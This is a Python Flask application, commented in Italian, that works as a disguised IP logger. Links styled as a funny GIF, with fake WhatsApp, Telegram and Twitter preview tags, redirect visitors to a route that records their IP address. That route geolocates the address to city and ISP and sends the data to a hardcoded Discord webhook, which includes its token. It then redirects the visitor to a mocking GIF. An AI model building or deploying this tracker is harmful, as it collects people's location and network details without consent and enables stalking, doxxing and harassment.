from flask import Flask, request, redirect
from datetime import datetime
import requests
import os

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1528013241819594853/ajTR7-zJ32yBsxulXb4688xXeWaqVgr9pQk6dW3ffPpFaeWgbWydLkRQyH6M56515lNA"

# Link finale a cui reindirizzare
FINAL_URL = "https://tenor.com/it/view/gay-flag-gay-rainbow-flag-pride-gay-pride-gif-25643563"

def get_real_ip(request):
    forwarded = request.headers.get('X-Forwarded-For', '')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return request.remote_addr

def get_ip_info(ip):
    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp",
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                return {
                    "country": data.get("country", "N/D"),
                    "region": data.get("regionName", "N/D"),
                    "city": data.get("city", "N/D"),
                    "isp": data.get("isp", "N/D")
                }
    except:
        pass
    return None

def send_to_discord(ip, ip_info):
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
    
    description = f"**📅 Data:** {date}\n"
    if ip_info:
        description += f"**🌍 Paese:** {ip_info.get('country', 'N/D')}\n"
        description += f"**📍 Regione:** {ip_info.get('region', 'N/D')}\n"
        description += f"**🏙️ Città:** {ip_info.get('city', 'N/D')}\n"
        description += f"**🔌 ISP:** {ip_info.get('isp', 'N/D')}"
    else:
        description += "**⚠️ Geolocalizzazione non disponibile**"
    
    data = {
        "content": "🔔 **Nuovo IP loggato!**",
        "embeds": [{
            "title": f"IP: {ip}",
            "description": description,
            "color": 5814783,
            "timestamp": date
        }]
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code == 204:
            print(f"✅ Inviato: {ip}")
        else:
            print(f"❌ Errore: {response.status_code}")
    except Exception as e:
        print(f"❌ Eccezione: {e}")

@app.route("/")
def index():
    ip = get_real_ip(request)
    print(f"🌐 IP: {ip}")
    
    ip_info = get_ip_info(ip)
    send_to_discord(ip, ip_info)
    
    return redirect(FINAL_URL)

# NUOVA ROUTE CON ANTEPRIMA PERSONALIZZATA
@app.route("/video")
@app.route("/watch")
@app.route("/gif")
@app.route("/link")
def preview():
    return """
    <!DOCTYPE html>
    <html lang="it">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        <!-- ANTEPRIMA PER WHATSAPP/TELEGRAM/SOCIAL -->
        <meta property="og:title" content="Guarda questa GIF! 😂">
        <meta property="og:description" content="Non riesco a smettere di ridere, devi vederla!">
        <meta property="og:image" content="https://media.tenor.com/0vG5zB4Htq0AAAAM/gay-flag.gif">
        <meta property="og:type" content="website">
        <meta property="og:url" content="https://apppy-production-6842.up.railway.app/video">
        <meta property="og:site_name" content="GIF divertenti">
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:title" content="Guarda questa GIF! 😂">
        <meta name="twitter:description" content="Non riesco a smettere di ridere!">
        <meta name="twitter:image" content="https://media.tenor.com/0vG5zB4Htq0AAAAM/gay-flag.gif">
        
        <style>
            body {
                margin: 0;
                padding: 0;
                background: #000;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                font-family: Arial, sans-serif;
            }
            .loader {
                text-align: center;
                color: #fff;
            }
            .loader p {
                font-size: 18px;
                margin-top: 20px;
                animation: pulse 1.5s infinite;
            }
            @keyframes pulse {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.5; }
            }
        </style>
        
        <!-- REDIRECT IMMEDIATO -->
        <meta http-equiv="refresh" content="0;url=/">
    </head>
    <body>
        <div class="loader">
            <p>Caricamento GIF in corso...</p>
        </div>
        <script>
            // Redirect immediato via JavaScript
            window.location.href = "/";
        </script>
    </body>
    </html>
    """

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
